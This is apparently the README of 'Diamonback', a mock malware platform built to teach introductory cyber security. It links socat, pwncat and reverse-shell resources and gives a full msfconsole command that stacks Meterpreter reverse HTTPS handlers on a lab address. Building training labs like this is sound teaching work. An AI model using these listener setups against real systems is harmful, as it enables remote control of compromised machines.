# Diamonback 
This is the faux malware platform I createad as a teaching aid for students in
cyber security introductory training. This product is NOT malcious in the least
but will act like a malware platform in several ways. 

# socat

* https://gtfobins.github.io/gtfobins/socat/

# pwncat
This platform is designed to make use of the pwncat platform for Python. This 
took a bit of work to get functional on Ubuntu 24.04 as it is not built to
support Python greater than 3.11. 

* https://www.youtube.com/watch?v=Lwv4aSyCEZY
* https://github.com/OlivierProTips/HackNotes/blob/master/pwncat-cs.md


# Shell Generators:

https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/

# msfconsole Handler Stacking
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 10.0.0.190; set LPORT 8443; set ExitOnSession false; exploit -j;use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_https; set LHOST 10.0.0.190; set LPORT 8843; set ExitOnSession false; exploit -j"

